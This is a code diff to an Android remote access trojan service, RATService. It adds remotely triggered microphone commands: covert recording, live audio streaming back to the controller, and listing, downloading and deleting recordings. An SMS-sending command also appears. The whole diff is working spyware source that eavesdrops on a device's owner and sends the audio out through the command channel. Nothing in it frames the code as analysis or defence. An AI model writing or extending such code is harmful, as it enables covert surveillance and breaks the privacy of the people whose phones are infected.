@@ -857,24 +857,258 @@ public class RATService extends Service {
                 }
                 break;
                 
-            case "mic":
-            case "mic_start":
-                if (micModule != null) {
-                    String result = micModule.startRecording(30);
-                    sendCommand("MIC|" + result);
-                } else {
-                    sendCommand("MIC|ERROR: Microphone module not available");
+           // Microphone commands
+case "mic":
+case "mic_start":
+case "start_recording":
+    if (micModule != null) {
+        Log.d(TAG, "🎤 Starting recording");
+        
+        // Parse args: format|duration|bitrate
+        String[] parts = args.split("\\|");
+        String format = parts.length > 0 ? parts[0] : "mp3";
+        int duration = parts.length > 1 ? Integer.parseInt(parts[1]) : 30;
+        int bitrate = parts.length > 2 ? Integer.parseInt(parts[2]) : 128;
+        
+        String result = micModule.startRecording(duration, format, bitrate);
+        
+        // Send acknowledgment
+        try {
+            JSONObject response = new JSONObject();
+            response.put("command", "mic_response");
+            response.put("action", "start_recording");
+            response.put("status", result.startsWith("SUCCESS") ? "success" : "error");
+            response.put("message", result);
+            sendCommand(response.toString());
+        } catch (JSONException e) {
+            Log.e(TAG, "JSON error", e);
+        }
+    } else {
+        sendCommand("MIC|ERROR: Microphone module not available");
+    }
+    break;
+    
+case "mic_stop":
+case "stop_recording":
+    if (micModule != null) {
+        Log.d(TAG, "🎤 Stopping recording");
+        String result = micModule.stopRecording();
+        
+        // Send the recording data
+        try {
+            JSONObject response = new JSONObject(result);
+            response.put("command", "mic_response");
+            response.put("action", "stop_recording");
+            sendCommand(response.toString());
+        } catch (JSONException e) {
+            sendCommand("MIC_STOP|" + result);
+        }
+    } else {
+        sendCommand("MIC_STOP|ERROR: Microphone module not available");
+    }
+    break;
+    
+case "mic_stream":
+case "start_streaming":
+    if (micModule != null) {
+        Log.d(TAG, "🎤 Starting live stream");
+        
+        // Parse args: sampleRate|bitrate|format
+        String[] parts = args.split("\\|");
+        int sampleRate = parts.length > 0 ? Integer.parseInt(parts[0]) : 44100;
+        int bitrate = parts.length > 1 ? Integer.parseInt(parts[1]) : 128;
+        String format = parts.length > 2 ? parts[2] : "mp3";
+        
+        // Set up streaming callback
+        String result = micModule.startStreaming(sampleRate, bitrate, format, 
+            new MicModule.StreamDataCallback() {
+                @Override
+                public void onStreamData(byte[] data, int length) {
+                    try {
+                        JSONObject streamData = new JSONObject();
+                        streamData.put("command", "mic_stream_data");
+                        streamData.put("data", Base64.encodeToString(data, Base64.NO_WRAP));
+                        streamData.put("length", length);
+                        sendCommand(streamData.toString());
+                    } catch (JSONException e) {
+                        Log.e(TAG, "Error sending stream data", e);
+                    }
                 }
-                break;
                 
-            case "mic_stop":
-                if (micModule != null) {
-                    String result = micModule.stopRecording();
-                    sendCommand("MIC_STOP|" + result);
-                } else {
-                    sendCommand("MIC_STOP|ERROR: Microphone module not available");
+                @Override
+                public void onStreamError(String error) {
+                    try {
+                        JSONObject errorData = new JSONObject();
+                        errorData.put("command", "mic_stream_error");
+                        errorData.put("error", error);
+                        sendCommand(errorData.toString());
+                    } catch (JSONException e) {
+                        Log.e(TAG, "Error sending stream error", e);
+                    }
                 }
-                break;
+            });
+        
+        try {
+            JSONObject response = new JSONObject();
+            response.put("command", "mic_response");
+            response.put("action", "start_streaming");
+            response.put("status", result.startsWith("SUCCESS") ? "success" : "error");
+            response.put("message", result);
+            sendCommand(response.toString());
+        } catch (JSONException e) {
+            Log.e(TAG, "JSON error", e);
+        }
+    } else {
+        sendCommand("MIC_STREAM|ERROR: Microphone module not available");
+    }
+    break;
+    
+case "mic_stream_stop":
+case "stop_streaming":
+    if (micModule != null) {
+        Log.d(TAG, "🎤 Stopping live stream");
+        String result = micModule.stopStreaming();
+        
+        try {
+            JSONObject response = new JSONObject();
+            response.put("command", "mic_response");
+            response.put("action", "stop_streaming");
+            response.put("status", "success");
+            response.put("message", result);
+            sendCommand(response.toString());
+        } catch (JSONException e) {
+            Log.e(TAG, "JSON error", e);
+        }
+    } else {
+        sendCommand("MIC_STREAM_STOP|ERROR: Microphone module not available");
+    }
+    break;
+    
+case "mic_list":
+case "get_recordings":
+    if (micModule != null) {
+        Log.d(TAG, "🎤 Getting recordings list");
+        String result = micModule.getRecordings();
+        
+        try {
+            JSONObject response = new JSONObject(result);
+            response.put("command", "mic_response");
+            response.put("action", "list_recordings");
+            sendCommand(response.toString());
+        } catch (JSONException e) {
+            sendCommand("MIC_LIST|" + result);
+        }
+    } else {
+        sendCommand("MIC_LIST|ERROR: Microphone module not available");
+    }
+    break;
+    
+case "mic_play":
+case "play_recording":
+    if (micModule != null && !args.isEmpty()) {
+        Log.d(TAG, "🎤 Playing recording: " + args);
+        String result = micModule.playRecording(args);
+        
+        try {
+            JSONObject response = new JSONObject();
+            response.put("command", "mic_response");
+            response.put("action", "play_recording");
+            response.put("status", result.startsWith("SUCCESS") ? "success" : "error");
+            response.put("message", result);
+            sendCommand(response.toString());
+        } catch (JSONException e) {
+            Log.e(TAG, "JSON error", e);
+        }
+    } else {
+        sendCommand("MIC_PLAY|ERROR: No file specified");
+    }
+    break;
+    
+case "mic_stop_play":
+case "stop_playback":
+    if (micModule != null) {
+        Log.d(TAG, "🎤 Stopping playback");
+        String result = micModule.stopPlayback();
+        
+        try {
+            JSONObject response = new JSONObject();
+            response.put("command", "mic_response");
+            response.put("action", "stop_playback");
+            response.put("status", "success");
+            response.put("message", result);
+            sendCommand(response.toString());
+        } catch (JSONException e) {
+            Log.e(TAG, "JSON error", e);
+        }
+    } else {
+        sendCommand("MIC_STOP_PLAY|ERROR: Microphone module not available");
+    }
+    break;
+    
+case "mic_delete":
+case "delete_recording":
+    if (micModule != null && !args.isEmpty()) {
+        Log.d(TAG, "🎤 Deleting recording: " + args);
+        String result = micModule.deleteRecording(args);
+        
+        try {
+            JSONObject response = new JSONObject(result);
+            response.put("command", "mic_response");
+            response.put("action", "delete_recording");
+            sendCommand(response.toString());
+        } catch (JSONException e) {
+            sendCommand("MIC_DELETE|" + result);
+        }
+    } else {
+        sendCommand("MIC_DELETE|ERROR: No file specified");
+    }
+    break;
+    
+case "mic_download":
+case "download_recording":
+    if (micModule != null && !args.isEmpty()) {
+        Log.d(TAG, "🎤 Downloading recording: " + args);
+        String result = micModule.downloadRecording(args);
+        
+        try {
+            JSONObject response = new JSONObject(result);
+            response.put("command", "mic_response");
+            response.put("action", "download_recording");
+            sendCommand(response.toString());
+        } catch (JSONException e) {
+            sendCommand("MIC_DOWNLOAD|" + result);
+        }
+    } else {
+        sendCommand("MIC_DOWNLOAD|ERROR: No file specified");
+    }
+    break;
+    
+case "mic_settings":
+case "configure_mic":
+    if (micModule != null) {
+        Log.d(TAG, "🎤 Configuring microphone: " + args);
+        
+        // Parse args: sampleRate|bitrate|format|channel
+        String[] parts = args.split("\\|");
+        int sampleRate = parts.length > 0 ? Integer.parseInt(parts[0]) : 44100;
+        int bitrate = parts.length > 1 ? Integer.parseInt(parts[1]) : 128;
+        String format = parts.length > 2 ? parts[2] : "mp3";
+        String channel = parts.length > 3 ? parts[3] : "mono";
+        
+        String result = micModule.configureSettings(sampleRate, bitrate, format, channel);
+        
+        try {
+            JSONObject response = new JSONObject(result);
+            response.put("command", "mic_response");
+            response.put("action", "configure_settings");
+            sendCommand(response.toString());
+        } catch (JSONException e) {
+            sendCommand("MIC_SETTINGS|" + result);
+        }
+    } else {
+        sendCommand("MIC_SETTINGS|ERROR: Microphone module not available");
+    }
+    break;
                 
             case "sms_send":
                 if (smsModule != null && args.contains("|")) {
